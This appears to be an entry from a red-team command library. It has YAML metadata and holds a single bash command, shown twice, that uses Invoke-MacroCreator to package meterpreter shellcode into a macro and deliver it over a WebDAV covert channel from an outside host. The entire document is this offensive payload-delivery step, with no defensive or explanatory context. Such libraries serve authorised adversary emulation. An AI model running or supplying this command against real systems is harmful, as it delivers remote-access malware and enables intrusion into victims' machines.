---
id: 339ee750-270f-469d-85f8-03853166f15b
name: Deliver shellcode over WebDAV covert channel
type: command
executor: bash
data: Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com
  -d webdav -o
output: null
created_at: '2023-04-06T03:56:23.416452+00:00'
updated_at: '2023-04-10T20:36:48.550721+00:00'
---

# Deliver shellcode over WebDAV covert channel

```bash
Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o
```


